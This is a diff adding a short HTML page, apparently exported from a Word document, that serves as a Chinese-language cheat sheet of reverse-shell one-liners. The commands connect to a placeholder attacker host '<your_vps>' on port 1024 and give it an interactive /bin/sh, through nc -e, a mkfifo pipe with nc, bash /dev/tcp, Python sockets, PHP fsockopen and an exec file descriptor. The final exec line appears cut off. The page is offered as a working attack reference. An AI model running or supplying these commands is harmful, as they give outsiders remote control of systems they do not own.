@@ -1,0 +1,20 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="nc反弹常用命令"><span class="csDE05BCC">nc</span><span class="csECDA2D3">反弹常用命令</span></a></h1>
+		<p class="cs3A447A38"><span class="cs7FFD2630">用</span><span class="cs9FB05234"> nc </span><span class="cs7FFD2630">反弹，命令如下：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">nc &lt;your_vps&gt; 1024 -e /bin/sh</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">某些目标的</span><span class="cs9FB05234"> nc </span><span class="cs7FFD2630">不支持</span><span class="cs9FB05234"> -e </span><span class="cs7FFD2630">参数，有两个解决思路，要么使用其他版本的</span><span class="cs9FB05234"> nc</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">nc.traditional &lt;your_vps&gt; 1024 -e /bin/sh</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">要么配合命名管道进行反弹：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc &lt;your_vps&gt; 1024 &gt;/tmp/f</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">用</span><span class="cs9FB05234"> bash </span><span class="cs7FFD2630">反弹：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/bin/bash -i &gt;&amp; /dev/tcp/&lt;your_vps&gt;/1024 0&gt;&amp;1</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">用</span><span class="cs9FB05234"> python </span><span class="cs7FFD2630">反弹：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;your_vps&gt;&quot;,1024));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">用</span><span class="cs9FB05234"> PHP </span><span class="cs7FFD2630">反弹：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">php -r &#39;$sock=fsockopen(&quot;&lt;your_vps&gt;&quot;,1024);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">用</span><span class="cs9FB05234"> exec </span><span class="cs7FFD2630">反弹：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;your_vps&gt;/1024; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;19</span></p></body>
+</html>
